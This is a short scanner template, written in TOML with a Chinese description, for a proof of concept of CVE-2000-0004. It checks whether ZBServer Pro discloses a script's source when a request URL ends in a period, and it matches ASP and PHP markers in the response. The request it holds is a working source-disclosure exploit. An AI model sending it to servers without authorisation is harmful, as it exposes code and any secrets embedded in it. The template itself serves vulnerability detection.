[info]
author = "AVE"
description = "检测 ZBServer Pro 是否在请求 URL 末尾添加句点（.）后泄露可执行文件源代码"
id = "POC-AVE-2000-0006"
name = "ZBServer Pro Source Code Disclosure PoC"
severity = "medium"
tags = ["cve-2000-0004"]
vuln_id = [
    "CVE-2000-0004",
    "AVE-2000-0006",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{Path}}."
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<?php",
    "Response.Write",
    "Server.CreateObject",
]
